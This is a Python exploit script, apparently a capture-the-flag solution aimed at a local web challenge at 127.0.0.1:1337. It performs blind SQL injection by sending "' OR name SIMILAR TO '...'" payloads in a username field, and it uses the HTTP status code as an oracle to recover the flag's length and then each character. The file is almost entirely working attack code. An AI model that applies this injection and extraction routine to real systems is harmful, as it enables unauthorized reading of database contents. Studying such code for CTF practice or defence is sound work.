#!/usr/bin/env python3
import requests
from string import ascii_letters, digits

class Exploit:
    def __init__(self, baseUrl):
        self.baseUrl = baseUrl
        self.SUBMIT_ROUTE = '/submit'
        self.WILDCARD_CHARACTER = '_'
        self.EXCLUDED_NAMES = ('peng', 'emperor')
        self.EXCLUDED_NAMES_LENGTH = tuple(len(name) for name in self.EXCLUDED_NAMES)

        # underscore (_) and single quote (') character is excluded, 
        # because it's the wildcard character and will cause syntax error
        # space ( ) character is also excluded, because the flag format shouldn't have that character?
        self.ALLOWED_CHARS = sorted(set(ascii_letters + digits + "flag{aword}"))
        self.PREPENDED_FLAG = 'lactf{'
        self.PREPENDED_FLAG_LENGTH = len(self.PREPENDED_FLAG)
        self.APPENDED_FLAG = '}'
        self.APPENDED_FLAG_LENGTH = len(self.APPENDED_FLAG)

    def leakFlagStringLength(self):
        for length in range(1, 100):
            print(f'[*] Finding flag string length | Current length: {length}', end='\r')

            payload = f"' OR name SIMILAR TO '{self.WILDCARD_CHARACTER * length}"
            data = {
                'username': payload
            }
            
            response = requests.post(f'{self.baseUrl}{self.SUBMIT_ROUTE}', data=data)
            isFailed = True if response.status_code == 201 else False
            if isFailed:
                continue
            if length == self.EXCLUDED_NAMES_LENGTH[0] or length == self.EXCLUDED_NAMES_LENGTH[1]:
                if length == self.EXCLUDED_NAMES_LENGTH[0]:
                    print(f'[*] Length {length} returned boolean value True, but the length is same as the database\'s penguin name "{self.EXCLUDED_NAMES[0]}"')
                elif length == self.EXCLUDED_NAMES_LENGTH[1]:
                    print(f'[*] Length {length} returned boolean value True, but the length is same as the database\'s penguin name "{self.EXCLUDED_NAMES[1]}"')

                continue

            return length

    def leakFlagData(self, flagStringLength):
        leakedFlag, formattedFlag = str(), str()
        while len(formattedFlag) < flagStringLength:
            formattedFlag = self.PREPENDED_FLAG + leakedFlag + self.APPENDED_FLAG
            if len(formattedFlag) == flagStringLength:
                break

            for character in self.ALLOWED_CHARS:
                print(f'[*] Brute forcing character "{character}" | Current leaked flag: {formattedFlag}', end='\r')

                regexCharacters = leakedFlag + character
                charactersLeft = flagStringLength - self.PREPENDED_FLAG_LENGTH - self.APPENDED_FLAG_LENGTH - len(regexCharacters)

                regexPattern = self.WILDCARD_CHARACTER * self.PREPENDED_FLAG_LENGTH
                regexPattern += regexCharacters
                regexPattern += self.WILDCARD_CHARACTER * charactersLeft
                regexPattern += self.WILDCARD_CHARACTER * self.APPENDED_FLAG_LENGTH

                payload = f"' OR name SIMILAR TO '{regexPattern}"
                data = {
                    'username': payload
                }
                response = requests.post(f'{self.baseUrl}{self.SUBMIT_ROUTE}', data=data)
                isFailed = True if response.status_code == 201 else False
                isLastCharacter = True if character == self.ALLOWED_CHARS[-1] else False
                isFailedLastCharacter = True if isFailed and isLastCharacter else False

                # if we loop through all possible character and still failed, 
                # we can assume that the correct flag character is the underscore character
                if isFailedLastCharacter:
                    leakedFlag += self.WILDCARD_CHARACTER
                    break

                if isFailed:
                    continue

                leakedFlag += character
                break

        isLeakedSuccessfully = False
        if len(formattedFlag) != flagStringLength:
            return isLeakedSuccessfully, formattedFlag

        isLeakedSuccessfully = True
        return isLeakedSuccessfully, formattedFlag

if __name__ == '__main__':
    baseUrl = 'http://127.0.0.1:1337'
    exploit = Exploit(baseUrl)

    print('[*] Leaking the flag string length...')
    flagStringLength = exploit.leakFlagStringLength()
    if not flagStringLength:
        print('\n[-] Unable to find the correct flag string length')
        exit(0)

    print(f'\n[+] We found the correct flag string length: {flagStringLength}')

    print('[*] Leaking the flag...')
    isLeakedSuccessfully, formattedFlag = exploit.leakFlagData(flagStringLength)
    if not isLeakedSuccessfully:
        print(f'\n[-] The leaked flag length is not the same as the flag string length ({flagStringLength}). Leaked flag: {formattedFlag}')
        exit(0)

    print(f'\n[+] The flag has been fully leaked! Flag: {formattedFlag}')